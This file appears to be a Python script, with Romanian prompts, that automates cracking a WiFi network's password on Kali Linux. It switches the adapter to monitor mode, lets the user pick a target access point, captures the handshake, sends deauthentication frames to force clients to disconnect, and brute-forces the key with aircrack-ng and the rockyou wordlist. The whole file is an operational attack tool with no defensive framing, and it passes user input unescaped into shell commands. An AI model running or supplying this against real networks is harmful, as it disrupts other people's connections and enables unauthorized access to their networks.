from os import system
from time import sleep
import subprocess


system('ip a')
wlan=input('introduceti interfata ex:(wlan0): ')
#wlan = "wlan0"
#faza 1
airmon_start = 'sudo airmon-ng start {0}'.format(wlan)
system(airmon_start)

sleep(3)
#faza 2
system('nmcli dev wifi')
bssid = input('Introduceti bssid-ul dorit: ')
ch = input('introduceti channel-ul respectiv: ')
#bssid = '18:DE:D7:2B:AB:DC'
#ch ='6'

#faza 3
pwd = '/home/kali/Desktop/hack'
system('mkdir '+pwd)
airodump = 'sudo xterm -e airodump-ng --bssid {0} -c {1} -w {2}/hackme {3}mon'.format(bssid,ch,pwd,wlan)
system(airodump)



#faza 4
aireplay= 'sudo aireplay-ng -0 4 -a {0} {1}mon'.format(bssid,wlan)
system(aireplay)

#faza 4
airmon_stop = 'sudo airmon-ng stop {0}mon'.format(wlan)
system(airmon_stop)

#faza 5
pwd_cheie='/usr/share/wordlists/rockyou.txt'
aircrack = 'sudo aircrack-ng {0}/hackme-01.cap -w {1}'.format(pwd,pwd_cheie)
system(aircrack)
